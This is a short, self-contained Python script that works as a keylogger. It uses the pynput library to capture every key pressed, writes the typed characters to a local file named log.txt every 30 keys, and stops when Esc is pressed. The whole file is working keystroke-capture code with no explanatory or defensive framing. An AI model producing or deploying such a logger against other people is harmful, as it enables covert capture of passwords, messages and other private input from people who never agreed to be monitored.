import pynput

from pynput.keyboard import Key, Listener
keys=[]
count=0

def on_press(key):
    global keys,count

    keys.append(key)
    count+=1
    # For every 30 keys we would update the keys list
    if count >= 30:
        count=0
        write_file(keys)
        keys=[]

def on_release(key):
    if key==Key.esc:
        return False
def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


